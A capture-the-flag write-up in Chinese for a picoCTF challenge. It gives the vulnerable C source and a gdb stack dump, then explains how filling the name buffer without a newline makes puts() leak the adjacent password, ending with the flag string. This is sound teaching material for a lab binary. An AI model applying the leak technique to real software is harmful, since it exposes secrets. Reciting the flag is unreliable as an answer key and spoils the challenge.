## Source code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```

## Pwn
首先觀察一下 local variables 的配置順序：`password` -> `name` -> `password_input`

所以在 memory 中順序應該是 (low) `password_input` -> `name` -> `password` (high)
```
char password[64];
char name[256];
char password_input[64];
```

用 gdb 驗證一下：
```
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,
Please Enter the Password.
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

(gdb) x/200x $ebp-0x200
0xffffc3f8:     0x0000003f      0x0000000a      0x00000001      0x0000000a
0xffffc408:     0x00000047      0x00000000      0xf7f96000      0xffffc4a4
0xffffc418:     0xf7db1cc0      0xffffc464      0xf7f96d80      0x08048a6d
0xffffc428:     0xffffc454      0x9375c800      0xffffc5f8      0xf7fe9540
0xffffc438:     0xffffc5a4      0x00000000      0xf7f96000      0xffffc4d0
0xffffc448:     0xffffc5f8      0x0804887d      0xffffc464      0xffffc5a4
0xffffc458:     0xf7f965c0      0x080486f6      0xf7ffd518      0x42424242 -+
0xffffc468:     0x42424242      0x42424242      0x42424242      0x42424242  |
0xffffc478:     0x42424242      0x42424242      0x42424242      0x42424242  | password_input
0xffffc488:     0x00000a42      0x00000000      0x00000000      0x00000000 -+
0xffffc498:     0x00000000      0x00000000      0x00000000      0x41414100 -+
0xffffc4a8:     0x41414141      0x41414141      0x41414141      0x41414141  |
0xffffc4b8:     0x41414141      0x41414141      0x41414141      0x41414141  |
0xffffc4c8:     0x41414141      0x2c414141      0x656c500a      0x20657361  | name
0xffffc4d8:     0x65746e45      0x68742072      0x61502065      0x6f777373  |
0xffffc4e8:     0x002e6472      0x00000000      0x00000000      0x00000000  |
0xffffc4f8:     0x00000000      0x00000000      0x00000000      0x00000000  |
-- trimmed --
```

關鍵在於這個地方，假設今天使用者的 input 最後不是 '\n'，那麼這個 buffer 的尾端就不會有一個 null byte
```
fgets(name, sizeof(name), stdin);
char *end = strchr(name, '\n');
if (end != NULL) {
  *end = '\x00';
}
```

所以我們就讓 `name` 整個 buffer 塞滿，這樣稍後 `puts(name)` 的地方，因爲沒有 0x00 截斷字串，`password` 就會連帶被印出來了。

最後把泄漏出來的 password 輸入到程式裏，即可拿到 flag

flag: `picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_958ebb8e}`
